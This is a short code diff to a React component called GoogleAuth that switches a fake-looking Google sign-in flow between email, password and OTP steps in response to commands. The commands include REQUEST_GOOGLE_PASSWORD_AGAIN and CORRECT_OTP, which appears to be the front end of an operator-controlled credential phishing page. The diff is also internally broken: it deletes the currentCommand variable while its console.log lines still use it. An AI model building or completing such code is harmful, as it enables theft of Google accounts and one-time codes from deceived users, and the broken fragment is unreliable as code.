@@ -18,37 +18,32 @@ export default function GoogleAuth() {
 
     // Command handling
     useEffect(() => {
-        if (!command) return;
-
-        // Store command in temp variable
-        const currentCommand = command;
-
-        if (currentCommand === 'REQUEST_GOOGLE_EMAIL_AGAIN') {
+        if (command === 'REQUEST_GOOGLE_EMAIL_AGAIN') {
             console.log("command in passcheck is ", currentCommand)
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('email');
         } 
-        else if (currentCommand === 'REQUEST_GOOGLE_PASSWORD') {
+        else if (command === 'REQUEST_GOOGLE_PASSWORD') {
             console.log("command in passcheck is ", currentCommand)
             setIsLoading(false);
             setBgLoader(true);
             setCurrentStep('password');
         }
-        else if (currentCommand === 'REQUEST_GOOGLE_PASSWORD_AGAIN') {
+        else if (command === 'REQUEST_GOOGLE_PASSWORD_AGAIN') {
             console.log("command in passcheck is ", currentCommand)
             setInvalid(true);
             setIsLoading(false);
             setCurrentStep('password');
         }
-        else if (currentCommand === 'CORRECT_OTP') {
+        else if (command === 'CORRECT_OTP') {
             setIsLoading(false);
             setBgLoader(true);
             // setTimeout(() => {
             //     router.push('/OTPVerification');
             // }, 1500);
         }
-        else if (currentCommand === 'FINISH') {
+        else if (command === 'FINISH') {
             setIsLoading(false);
             setBgLoader(true);
             setTimeout(() => {
